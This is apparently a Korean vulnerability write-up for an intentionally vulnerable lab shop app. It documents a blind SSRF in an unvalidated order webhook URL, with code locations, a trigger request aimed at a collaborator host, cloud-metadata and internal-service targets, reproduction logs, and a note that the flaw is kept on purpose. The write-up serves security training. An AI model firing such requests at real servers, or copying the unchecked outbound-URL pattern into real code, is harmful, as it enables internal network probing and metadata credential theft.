# VULN-004 주문 webhook URL SSRF

- 대상 스택: node-express, java-spring (동일)
- 심각도: High
- 분류: A01:2025 Broken Access Control (SSRF)

## 위치

- `apps/node-express/src/routes/orders.js` — `POST /api/orders`가 `webhookUrl`을 검증 없이 저장하고,
  **주문 생성 직후 `fireWebhook()`**(`order.created`)으로 그 URL에 `fetch()`한다. 결제 확인
  (`POST /api/orders/:id/confirm`) 성공 시 `order.paid`도 발송.
- `apps/java-spring/src/main/java/com/vulnlab/shop/controller/OrderController.java` — 동일 구조.
  `create()`가 `webhookUrl` 무검증 저장 후 `fireWebhook(..., "order.created", "pending")`을 호출하고,
  `confirm()` 성공 시 `order.paid`를 발송한다. `fireWebhook`는 `HttpClient.sendAsync`(비차단)로 그 URL에 `POST`.

```js
async function fireWebhook(webhookUrl, payload) {
  if (!webhookUrl) return;
  try {
    await fetch(webhookUrl, { method: 'POST', ... });
  } catch (err) { ... }
}
```

두 스택 모두 URL 스킴/호스트에 대한 allowlist가 전혀 없다 — `http://169.254.169.254/...` 같은 내부망·메타데이터 주소도 그대로 요청한다.

체크아웃에 **"주문 알림 URL"**(선택) 필드가 있어, 주문을 넣으면 서버가 그 URL로 "주문 접수"(`order.created`,
status `pending`) 웹훅을 **즉시** 발송한다(결제 확인 시 `order.paid`도 추가 발송). 즉 결제 완주 없이도
주문 생성만으로 서버가 임의 URL에 아웃바운드 요청을 보낸다.

## 트리거 방법

```
POST /api/{node,java}/orders
{"items":[{"productId":1,"quantity":1}],"webhookUrl":"http://<collaborator-host>/"}
→ 주문 생성 직후 서버가 webhookUrl 로 order.created 웹훅을 즉시 발송(결제·confirm 불필요)
```

내부 서비스(같은 Docker 네트워크의 다른 컨테이너 `http://mongo:27017`, `http://java-spring:8081/...` 등)를
지정하면 내부망 프로빙에 그대로 쓰인다. blind(응답은 반환하지 않음) — 응답 반환형 SSRF는
[[VULN-033-restock-callback-ssrf]](관리자 웹훅 테스트) 참고.

## 영향

- 서버를 프록시 삼아 임의 내부/외부 호스트로 blind 아웃바운드 요청 — 내부망 스캐닝, 클라우드 메타데이터
  엔드포인트 접근 시도 등. 5초 타임아웃 외 allowlist·스킴/호스트 검증이 전혀 없다. 로그인 사용자면 누구나
  주문 하나로 발화시킬 수 있다.

## 증거 (재현 확인)

2026-09-01, 로컬 재현(`:8090`, `user1`, Toss 미설정): 양 스택에서 `POST /orders`에 `webhookUrl` 지정 →
주문 생성만으로 즉시 발송 확인. `webhookUrl=http://mongo:27017/ssrf` 지정 시 mongo 로그에 node 컨테이너
(`172.20.0.4`)·java 컨테이너(`172.20.0.2`)發 연결 수신(`SSL handshake received but server is started
without SSL support` — HTTP 요청이 내부 서비스에 도달). node는 `webhookUrl=http://127.0.0.1:9/...` 시
`Order webhook delivery failed: fetch failed` 로그로 발송 시도 확인. **confirm/Toss 없이 재현됨.**

## 재구성 이력

당초 웹훅은 결제 confirm(Toss) 성공 경로에서만 발화해 정상 흐름 노출이 거의 없고 무-Toss 랩에서 재현이
불가했다. 이를 실제 커머스의 **"주문 접수 알림 웹훅"**(체크아웃의 선택 "주문 알림 URL" → 주문 생성 시
`order.created` 발송)으로 재구성해 자연스러운 기능 안에 넣고 재현 가능하게 했다. 취약점(스킴/호스트
allowlist 부재)은 그대로 유지. `fireWebhook`는 java에서 `sendAsync`(비차단)로 발송한다.

## 조치 상태: 미조치 (의도된 취약점)
